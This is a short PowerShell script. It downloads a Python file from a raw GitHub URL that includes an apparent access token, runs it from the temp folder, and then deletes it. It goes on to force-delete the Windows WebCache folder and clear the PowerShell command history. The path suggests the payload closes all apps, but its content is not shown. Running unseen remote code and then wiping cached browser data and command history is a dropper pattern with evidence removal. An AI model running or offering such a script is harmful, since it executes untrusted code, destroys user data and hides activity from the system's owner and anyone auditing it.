# Download Python script
$scriptUrl = "https://raw.githubusercontent.com/Zenin0/Glitter_Scripts/main/Windows/CloseAllApps/script.py?token=GHSAT0AAAAAACJCV62UA5IVM6QMUZ6KX3UWZJVSG2Q"
$savePath = "$env:temp\script.py"
(New-Object System.Net.WebClient).DownloadFile($scriptUrl, $savePath)

# Execute Python script
& python $savePath

# Delete the downloaded script
Remove-Item $savePath

# Clear the download history from the system's web cache
Remove-Item -Path "$env:LOCALAPPDATA\Microsoft\Windows\WebCache\*" -Recurse -Force

# Clear the PowerShell command history
Clear-History